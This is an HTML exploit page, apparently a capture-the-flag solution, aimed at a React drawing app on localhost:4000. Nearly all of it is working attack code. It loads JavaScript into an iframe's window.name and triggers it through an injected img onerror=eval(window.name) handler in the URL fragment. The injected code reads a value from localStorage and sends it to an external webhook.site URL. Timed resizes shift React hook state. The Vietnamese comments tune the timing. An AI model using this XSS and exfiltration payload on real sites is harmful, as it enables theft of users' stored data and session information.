<!DOCTYPE html>
<html>
<head>
    <title>Exploit Safe Mode</title>
</head>
<body>
    <iframe src="about:blank" id="exploitFrame" style="width: 10px; height: 500px; border: none;"></iframe>

    <script>
        const EXFIL_SERVER = "https://webhook.site/0a84fa24-d4f3-4e1c-8ef0-42cd755a0922"; 
        const TARGET_SERVER = "http://localhost:4000"; 

        const frame = document.getElementById("exploitFrame");

        frame.contentWindow.name = "const flag = localStorage.getItem('username'); if (flag) { new Image().src = '" + EXFIL_SERVER + "/?flag=' + encodeURIComponent(flag); }";

        // Tăng từ 2 giây lên 4 giây để đảm bảo khung iframe ổn định và nạp xong URL ban đầu
        setTimeout(function() {
            frame.src = TARGET_SERVER + "/drawing/pwn#src=none&onerror=eval(window.name)&is=img";
        }, 4000);

        // Tăng từ 5 giây lên 10 giây để chắc chắn React đã dựng xong hoàn chỉnh cây Virtual DOM,
        // sau đó mới tung đòn quyết định thay đổi kích thước để "dịch chuyển" trạng thái Hook.
        setTimeout(function() {
            frame.style.width = "1200px";
        }, 10000);
    </script>
</body>
</html>
